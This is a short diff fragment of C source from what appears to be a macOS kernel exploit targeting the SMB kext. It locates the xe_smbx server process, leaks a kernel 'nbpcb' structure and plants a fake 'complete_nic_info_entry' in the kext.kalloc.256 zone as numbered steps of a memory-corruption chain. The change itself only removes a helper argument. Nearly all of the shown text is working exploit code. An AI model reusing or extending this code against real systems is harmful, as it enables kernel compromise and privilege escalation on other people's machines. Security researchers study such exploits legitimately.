@@ -160,9 +160,7 @@ int main(void) {
     int error = 0;
     int xe_smbx_pid = find_server_pid();
     xe_log_info("found xe_smbx running at pid: %d", xe_smbx_pid);
-    
-    kmem_neighbor_reader_t neighbor_reader = kmem_neighbor_reader_create(&smb_addr);
-    
+        
     // STEP 1: Obtain read access to an element in kext.kalloc.256 zone
     xe_log_info("start leaking struct nbpbc");
     kmem_zkext_free_session_t nbpcb_free_session = kmem_zkext_free_session_create(&smb_addr);
@@ -186,7 +184,7 @@ int main(void) {
     /// The `kmem_zkext_alloc_small` function can be used for allocating elements of size less than or equal to `UINT8_MAX`
     /// with controlled data, with a caveat that the first 8 bytes of the allocated memory cannot be controlled. Fortunately for
     /// constructing a valid `struct complete_nic_info_entry` we don't need control over the first 8 bytes
-    struct kmem_zkext_alloc_small_entry kext_256_element = kmem_zkext_alloc_small(&smb_addr, neighbor_reader, (char*)fake_nic + 8, 256 - 8 - 1);
+    struct kmem_zkext_alloc_small_entry kext_256_element = kmem_zkext_alloc_small(&smb_addr, (char*)fake_nic + 8, 256 - 8 - 1);
     xe_log_debug("allocated kext.256 element with fake complete_nic_info_entry at %p", (void*)kext_256_element.address);
     
     // STEP 1-c: Construct replacement for leaked `struct complete_nic_info_entry` with
